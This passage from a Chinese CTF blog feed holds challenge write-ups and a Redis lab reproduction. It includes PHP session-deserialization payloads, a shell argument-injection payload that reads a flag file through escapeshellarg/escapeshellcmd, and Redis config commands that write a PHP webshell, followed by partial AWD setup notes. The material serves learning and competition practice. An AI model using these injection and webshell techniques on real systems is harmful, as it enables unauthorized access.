class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">"flagphpflagphpflagphpflagphp"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">63</span><span class="token punctuation">:</span>"Yn8rt<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a<span class="token string">";}"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ payloadï¼Œåˆ©ç”¨extract($_POST)å‡½æ•°ä¼ å…¥postæ•°æ®é‡æ–°è¦†ç›–æ•°ç»„ä¸­çš„å€¼å¹¶ä¸”å˜é‡åŒ–ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagphpflagphpflagphpflagphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>Yn8rt<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8808%E6%97%A51741_1.png" alt></p><pre><code>/d0g3_fllllllag=&gt;L2QwZzNfZmxsbGxsbGFn&lt;?php$b = base64_encode(&#39;/d0g3_fllllllag&#39;);echo $b;$a = &#39;L2QwZzNfZmxsbGxsbGFn&#39;;echo strlen($a);//20?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8808%E6%97%A51747_2.png" alt></p><h4 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h4><p>åˆ©ç”¨çš„æ˜¯é”®åçš„æ¶ˆå¤±æ¥åŒ…è£¹åé¢çš„æ•°æ®ä½¿å…¶å¤±å»åŸæ¥çš„ä½œç”¨</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"flagphp] = ';s:5:"</span>Yn8rt<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span>'<span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//a:2:{s:7:"flagphp";s:52:";s:5:"Yn8rt";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8808%E6%97%A51841_3.png" alt></p><h1 id="2021-06-09"><a href="#2021-06-09" class="headerlink" title="2021-06-09"></a>2021-06-09</h1><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><h3 id="step1ï¼š"><a href="#step1ï¼š" class="headerlink" title="step1ï¼š"></a>step1ï¼š</h3><p>è®¿é—®login.php</p><p>è´¦å·ï¼šzhangwei</p><p>å¯†ç ï¼šzhangwei<em>*</em></p><p>burpsuiteç®€å•ä¸€çˆ†ç ´ï¼Œä¼šå¾—åˆ°å¯†ç ä¸º666</p><h3 id="step2ï¼š"><a href="#step2ï¼š" class="headerlink" title="step2ï¼š"></a>step2ï¼š</h3><p>ç„¶ååˆ©ç”¨scrabbleæ¥å®ç°gitæ³„éœ²çš„æºä»£ç æ³„éœ²é—®é¢˜ï¼š</p><pre><code>git clone https://github.com/denny0223/scrabble./scrabble https://xxx.xxx.xxx</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8809%E6%97%A51639_1.png" alt></p><p>å¾—åˆ°çš„ä»£ç å¾ˆç®€é™‹ï¼Œå¯èƒ½æ˜¯ä¸åœ¨å½“å‰ç‰ˆæœ¬</p><p>å…³äºgitçš„åº”ç”¨åŸºç¡€ï¼Œåœ¨ctfä¸­å»ºè®®å»äº†è§£ä¸€ä¸‹ctfhubçš„Gitæ³„éœ²ä¸­çš„åˆ†æ”¯çš„Logï¼š</p><p>1.gitå›æ»šï¼š</p><p>æ ¹æ®nullæˆ˜é˜Ÿçš„ä¹¦ä¸Šå†™çš„ï¼Œgitä½œä¸ºä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œä¼šè®°å½•æ¯æ¬¡æäº¤çš„ä¿®æ”¹ï¼Œæ‰€ä»¥å½“é¢˜ç›®å­˜åœ¨gitæ³„éœ²æ˜¯ï¼Œflagæ–‡ä»¶å¯ä»¥åœ¨ä¿®æ”¹ä¸­è¢«åˆ é™¤æˆ–è¢«è¦†ç›–ç‡ï¼Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨gitçš„<code>git reset</code>åæ¥æ¢å¤åˆ°ä»¥å‰çš„ç‰ˆæœ¬ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8809%E6%97%A51858_3.png" alt></p><p>ç„¶ååˆ©ç”¨git reset â€“hard æ¥æ¢å¤ä¸Šä¸€ç‰ˆæœ¬(è¿™é‡Œæˆ‘å‡ºç°äº†é—®é¢˜ï¼Œå§‹ç»ˆæ— æ³•æ¢å¤)</p><p>æ¢å¤åçš„index.phpï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//write_do.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-06-20"><a href="#2021-06-20" class="headerlink" title="2021-06-20"></a>2021-06-20</h1><h2 id="ç½‘é¼æ¯-2018-Commenté¢˜ç›®ç»­é›†"><a href="#ç½‘é¼æ¯-2018-Commenté¢˜ç›®ç»­é›†" class="headerlink" title="[ç½‘é¼æ¯ 2018]Commenté¢˜ç›®ç»­é›†"></a>[ç½‘é¼æ¯ 2018]Commenté¢˜ç›®ç»­é›†</h2><p><a href="https://www.runoob.com/php/func-string-addslashes.html" target="_blank" rel="noopener">PHP addslashes() å‡½æ•°</a>ï¼šå¯¹é¢„å®šä¹‰çš„å­—ç¬¦(<code>&#39;ã€&quot;ã€\</code>)è¿›è¡Œè½¬ä¹‰</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>ç¬¬ä¸‰éåšæ­¤é¢˜ï¼ŒåŸç†ä¸åŸç†çš„å·²ç»ä¸é‡è¦äº†ï¼Œåªéœ€è¦çŸ¥é“æƒ³è¦å®ç°å‘½ä»¤æ‰§è¡Œï¼Œå°±å¿…é¡»åœ¨è¾“å…¥çš„è¯­å¥å‰é¢åŠ ä¸Šå•å¼•å·å¹¶ä¸”éœ€è¦æœ‰ç©ºæ ¼æ¥åšé—´éš™</p><p>payloadï¼š</p><pre><code>&#39; -iL /flag -oN flag.txt &#39;</code></pre><p>system(â€˜python sqlmap .$_GET[â€˜aâ€™]â€™)</p><p>?a=127.0 \â€™;ls</p><p>127.0 â€˜ ;ls</p><p>escapeshellargå‡½æ•°çš„å­˜åœ¨ï¼Œä¸ºäº†ä¿éšœå®‰å…¨ï¼Œä¼šå°†å•å¼•å·ç»™è½¬ä¹‰ï¼Œä¿è¯ä¸å‰é¢çš„å•å¼•å·ä¸é—­åˆ</p><p><code>127.0 \&#39;;ls</code></p><p><code>&#39; 127.0 &#39;\&#39;&#39; ;ls &#39;</code></p><p>ç»è¿‡escapeshellcmdå‡½æ•°çš„è½¬ä¹‰æ“ä½œï¼Œ\å’Œæœ€åçš„å•å¼•å·è¢«ä¸€ä¸ªæ¥ä¸€ä¸ªçš„è½¬ä¹‰æ‰äº†</p><p><code>&#39; 127.0 &#39; \\&#39; &#39; ;ls &#39;</code></p><p><code>&#39; 127.0 &#39; \\&#39; &#39; ;ls &#39;</code></p><p><code>&#39; 127.0 &#39; \ &#39; &#39;;ls \&#39;</code></p><p><code>&#39; 127.0 &#39; \ ;ls \&#39;</code></p><p>æ­¤æ—¶lsåé¢çš„å•å¼•å·å°±æ˜¯ä½ è¦æŸ¥çœ‹çš„åå­—ä¸ºå•å¼•å·çš„ç›®å½•</p><p>ä¹Ÿå°±æ˜¯æœ€åçš„æƒ…å†µå°±æ˜¯<code>127.0\;ls&#39;</code></p><p>åŠ å·¥payloadï¼š</p><p><code>127&#39; -iL /flag -oN flag.txt &#39;</code></p><p><code>127&#39;\&#39;&#39;-iL /flag -oN flag.txt&#39;\&#39;&#39;</code></p><p><code>&#39;127&#39;\&#39;&#39;-iL /flag -oN flag.txt&#39;\&#39;&#39;&#39;</code></p><p>espaceshellcmd</p><p><code>&#39;127&#39;\\&#39;&#39;-iL /flag -oN flag.txt&#39;\\&#39;&#39;&#39;</code></p><p><code>&#39;127&#39;\\&#39;&#39;-iL /flag -oN flag.txt&#39;\\&#39;&#39;&#39;</code></p><p><code>&#39;127&#39;\-iL /flag -oN flag.txt&#39;\&#39;</code></p><p>æ€»ç»“ï¼šæƒ³è¦ä½ åé¢å‚æ•°çš„å‘½ä»¤å¾—åˆ°æ‰§è¡Œå°±è¦ä¿è¯å…¶ä¸­ä¸å«æœ‰escapeshellcmdè¦è¿‡æ»¤çš„ç‰¹æ®Šå­—ç¬¦ï¼ŒåŒæ—¶è®©ä½ ä¼ å…¥çš„å¥å­è¢«å•å¼•å·åŒ…è£¹ï¼ŒåŒæ—¶ç”¨ç©ºæ ¼åšé—´éš™</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisæœªæˆæƒè®¿é—®</title>
      <link href="/2021/05/23/redis-wei-shou-quan-fang-wen/"/>
      <url>/2021/05/23/redis-wei-shou-quan-fang-wen/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç¯å¢ƒæ­å»ºï¼š"><a href="#ç¯å¢ƒæ­å»ºï¼š" class="headerlink" title="ç¯å¢ƒæ­å»ºï¼š"></a>ç¯å¢ƒæ­å»ºï¼š</h1><h2 id="è‚‰é¸¡å‡†å¤‡æ­¥éª¤ï¼š"><a href="#è‚‰é¸¡å‡†å¤‡æ­¥éª¤ï¼š" class="headerlink" title="è‚‰é¸¡å‡†å¤‡æ­¥éª¤ï¼š"></a>è‚‰é¸¡å‡†å¤‡æ­¥éª¤ï¼š</h2><p>è‚‰é¸¡ipï¼š10.255.201.129</p><p>ä¸‹è½½å‡†å¤‡ç¯å¢ƒï¼š</p><pre><code> wget http://download.redis.io/releases/redis-2.8.17.tar.gz tar -zxvf redis-2.8.17.tar.gz cd redis-2.8.17.tar.gz cd src make all ./redis-server</code></pre><h2 id="Aæœºå‡†å¤‡æ­¥éª¤ï¼š"><a href="#Aæœºå‡†å¤‡æ­¥éª¤ï¼š" class="headerlink" title="Aæœºå‡†å¤‡æ­¥éª¤ï¼š"></a>Aæœºå‡†å¤‡æ­¥éª¤ï¼š</h2><p>Aæœºipï¼š10.255.201.128</p><p>éœ€è¦æœ‰redis-cliæ¥å®ç°æœªæˆæƒè®¿é—®çš„è¿æ¥</p><p>éœ€è¦çŸ¥é“ä½ webæœåŠ¡çš„ç»å¯¹è·¯å¾„</p><h1 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h1><pre class="line-numbers language-php"><code class="language-php">redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">10.255</span><span class="token punctuation">.</span><span class="token number">201</span><span class="token punctuation">.</span><span class="token function">129</span><span class="token punctuation">(</span> <span class="token operator">-</span>p <span class="token number">6379</span><span class="token punctuation">)</span>keys <span class="token operator">*</span>  <span class="token comment" spellcheck="true">//ç”¨æ¥æŸ¥çœ‹è¯¥redisæœåŠ¡å¯¹å…¬ç½‘å¼€æ”¾ï¼Œä¸”æœªå¯ç”¨è®¤è¯ã€‚</span>config set dir <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>wwwset xxx <span class="token string">"\n\n\n &lt;?php phpinfo();?> \n\n\n"</span>conifg set dbfilename shell<span class="token punctuation">.</span>phpsavequit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8823%E6%97%A51935_1.png" alt></p><p>ä¸Šä¼ webshellæˆåŠŸï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8823%E6%97%A51939_2.png" alt></p><p>å‚è€ƒç¬”è®°ï¼š<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">Redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°ä¸åˆ©ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWDç¬”è®°</title>
      <link href="/2021/04/25/awd-bi-ji/"/>
      <url>/2021/04/25/awd-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1815085049&auto=1&height=66"></iframe><h1 id="AWDåˆæ­¥è¦æ±‚"><a href="#AWDåˆæ­¥è¦æ±‚" class="headerlink" title="AWDåˆæ­¥è¦æ±‚"></a>AWDåˆæ­¥è¦æ±‚</h1><p>èµ·å› ï¼š4-24æ™šå‚åŠ bugkuçš„awdè·Œå€’ï¼Œå‡¸æ˜¾å‡ºçš„é—®é¢˜å¾ˆå¤šï¼Œæ•…æ­¤å¼€å§‹çˆ¬èµ·</p><h2 id="1-è¿ç”¨sshå‘½ä»¤è¿æ¥é¶æœºï¼š"><a href="#1-è¿ç”¨sshå‘½ä»¤è¿æ¥é¶æœºï¼š" class="headerlink" title="1.è¿ç”¨sshå‘½ä»¤è¿æ¥é¶æœºï¼š"></a>1.è¿ç”¨sshå‘½ä»¤è¿æ¥é¶æœºï¼š</h2><p>åœ¨kaliä¸­çš„å‘½ä»¤ï¼š</p><pre><code>ssh team32@192-168-1-255.bugku.awd.cn -p 2222</code></pre><p>è¿™é‡Œçš„sshç«¯å£ä¸º2222ï¼Œå¯†ç ä¸ºé˜Ÿä¼å¯†ç ï¼Œä½†æ˜¯éœ€è¦ä¿®æ”¹ä¸ºä½ è‡ªå·±çš„å¯†ç ï¼š</p><pre><code>su team32passwd</code></pre><h2 id="2-å°†ç½‘ç«™æºç å¤‡ä»½"><a href="#2-å°†ç½‘ç«™æºç å¤‡ä»½" class="headerlink" title="2.å°†ç½‘ç«™æºç å¤‡ä»½"></a>2.å°†ç½‘ç«™æºç å¤‡ä»½</h2><h3 id="ç†Ÿæ‚‰cpå‘½ä»¤ï¼š"><a href="#ç†Ÿæ‚‰cpå‘½ä»¤ï¼š" class="headerlink" title="ç†Ÿæ‚‰cpå‘½ä»¤ï¼š"></a>ç†Ÿæ‚‰cpå‘½ä»¤ï¼š</h3><pre><code>cp -r /var/www/html /tmp/test</code></pre><p>-ræ˜¯é€‰å®š/var/www/htmlè¿™ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶</p><p>å°†/var/www/htmlä¸‹çš„æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶å¤åˆ¶åˆ°ä¸/varåŒä¸€ä¸ªç›®å½•çš„/tmpç›®å½•ä¸‹çš„testç›®å½•ä¸­ï¼Œå¦‚æœtestä¸å­˜åœ¨åˆ™ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªtestç›®å½•</p><h3 id="å°†æºç æ‰“åŒ…ï¼š"><a href="#å°†æºç æ‰“åŒ…ï¼š" class="headerlink" title="å°†æºç æ‰“åŒ…ï¼š"></a>å°†æºç æ‰“åŒ…ï¼š</h3><h4 id="1-åˆ©ç”¨tarå‘½ä»¤"><a href="#1-åˆ©ç”¨tarå‘½ä»¤" class="headerlink" title="1.åˆ©ç”¨tarå‘½ä»¤"></a>1.åˆ©ç”¨tarå‘½ä»¤</h4><pre><code>tar -cvf name.tar /var/www/html</code></pre><p>å°†/var/www/htmlæŒ‡æ‰“åŒ…/var/www/htmlè¿™ä¸ªè·¯å¾„é‡Œé¢çš„ä¸œè¥¿</p><p>â€‹    -cå‚æ•°æ˜¯å»ºç«‹æ–°çš„å­˜æ¡£</p><p>â€‹    -vå‚æ•°è¯¦ç»†æ˜¾ç¤ºå¤„ç†çš„æ–‡ä»¶</p><p>â€‹    -få‚æ•°æŒ‡å®šå­˜æ¡£æˆ–è®¾å¤‡</p><p>â€‹    æ‰“åŒ…ä¹‹åå¦‚ä½•è§£åŒ…ï¼š</p><pre><code>tar -xvf name.tar</code></pre><p>   ä¸Šé¢è¿™ä¸ªè§£åŒ…å‘½ä»¤å°†ä¼šå°†æ–‡æ¡£è§£å¼€åœ¨å½“å‰ç›®å½•ä¸‹é¢ã€‚å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„è¿™ä¸ªå‘½ä»¤æ¥è§£åŒ…åˆ°æŒ‡å®šçš„è·¯å¾„ï¼š</p><pre><code>tar -xvf name.tar -C /var/www     ï¼ˆè§£åŒ…çš„å‚æ•°æ˜¯-Cï¼Œä¸æ˜¯å°å†™cï¼‰</code></pre><h4 id="2-åˆ©ç”¨zipå‘½ä»¤"><a href="#2-åˆ©ç”¨zipå‘½ä»¤" class="headerlink" title="2.åˆ©ç”¨zipå‘½ä»¤"></a>2.åˆ©ç”¨zipå‘½ä»¤</h4><p>ç›®æ ‡æ–‡ä»¶html</p><p>å°† /var/www/html/ è¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“åŒ…ä¸ºå½“å‰ç›®å½•ä¸‹çš„ html.zipï¼š</p><pre><code>zip -q -r html.zip /home/html</code></pre><p>å¦‚æœåœ¨æˆ‘ä»¬åœ¨ /var/www/html ç›®å½•ä¸‹ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre><code>zip -q -r html.zip *</code></pre><p>å‚æ•°ç†è§£ï¼š</p><ul><li>-q ä¸æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚</li><li>-r é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ä¸€å¹¶å¤„ç†ã€‚</li></ul><h3 id="è¿ç”¨xftpå®ç°æ–‡ä»¶ä¼ è¾“ï¼š"><a href="#è¿ç”¨xftpå®ç°æ–‡ä»¶ä¼ è¾“ï¼š" class="headerlink" title="è¿ç”¨xftpå®ç°æ–‡ä»¶ä¼ è¾“ï¼š"></a>è¿ç”¨xftpå®ç°æ–‡ä»¶ä¼ è¾“ï¼š</h3><p>é¦–å…ˆå®‰è£…vsftpdï¼ˆå¦‚æœåœ¨å†…ç½‘ç¯å¢ƒä¸‹å‚åŠ æ¯”èµ›çš„è¯å¯èƒ½å·²ç»æœ‰äº†ftpåŠŸèƒ½äº†ï¼‰</p><pre><code>apt install -y vsftpd # -yæ˜¯ä¸€è·¯é»˜è®¤yessystemctl enable vsftpd # è®¾ç½®å¼€æœºè‡ªå¯systemctl start vsftpd.service # å¯åŠ¨ftpæœåŠ¡systemctl status vsftpd.service # æŸ¥çœ‹ftpæœåŠ¡çŠ¶æ€ </code></pre><p>ç„¶ååˆ©ç”¨xftpæ¥å®ç°æ–‡ä»¶ä¼ 